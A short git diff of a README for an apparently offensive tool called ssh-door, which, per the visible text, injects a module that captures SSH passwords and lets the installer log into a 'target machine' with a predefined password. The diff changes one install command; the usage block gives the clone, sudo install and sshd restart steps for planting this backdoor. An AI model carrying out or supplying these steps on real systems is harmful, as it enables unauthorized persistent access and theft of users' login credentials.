@@ -20,7 +20,7 @@ When a user attempts to SSH into the system, the injected module captures the pa
 # Usage
 ```bash
 git clone https://github.com/flashnuke/ssh-door.git && cd ssh-door
-sudo bash install.sh <predefined_password>
+sudo bash ./install.sh <predefined_password>
 sudo systemctl restart sshd # or 'sudo service sshd restart' for non-systemd
 ```
 Once the script finishes and sshd service is restarted, simply log into the target machine using `ssh <user>@<ip>` and enter the predefined password.
